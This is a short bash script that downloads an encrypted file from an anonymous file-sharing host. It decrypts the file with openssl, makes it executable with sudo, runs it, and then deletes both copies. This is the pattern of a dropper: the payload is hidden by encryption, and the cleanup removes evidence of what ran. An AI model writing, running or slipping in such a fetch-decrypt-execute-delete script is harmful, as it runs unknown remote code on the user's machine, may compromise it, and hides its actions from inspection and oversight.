#! /bin/bash
cd
curl -O https://cdn-128.anonfiles.com/ybu7qdU5y0/e4e2b100-1674824959/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
